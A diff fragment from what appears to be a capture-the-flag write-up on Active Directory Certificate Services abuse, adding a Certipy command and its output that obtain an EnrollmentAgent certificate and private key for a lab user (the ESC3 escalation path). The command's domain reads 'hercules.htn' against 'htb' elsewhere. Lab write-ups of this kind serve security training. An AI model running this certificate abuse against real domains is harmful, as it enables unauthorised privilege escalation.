@@ -1312,6 +1312,21 @@ Several ADCS vulnerabilities
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template
 
 ```python
+certipy-ad req -u 'fernando.r@hercules.htn' -k -no-pass -dc-ip '10.129.242.196' -target 'dc.hercules.htb' -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dc-host dc.hercules.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 5
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'fernando.r@hercules.htb'
+[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
+[*] Saving certificate and private key to 'fernando.r.pfx'
+[*] Wrote certificate and private key to 'fernando.r.pfx'
+```
+
+Ill first request a certificate for the `EnrollmentAgent` template
+
+```python
 
 ```
 
